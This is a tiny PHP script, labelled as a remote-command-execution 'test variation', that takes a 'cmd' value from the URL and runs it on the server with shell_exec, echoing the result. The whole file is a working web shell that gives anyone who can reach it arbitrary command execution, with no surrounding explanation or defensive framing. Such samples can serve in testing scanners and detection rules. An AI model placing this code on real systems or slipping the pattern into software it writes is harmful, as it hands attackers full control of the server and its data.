<?php
// RCE test variation #445
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>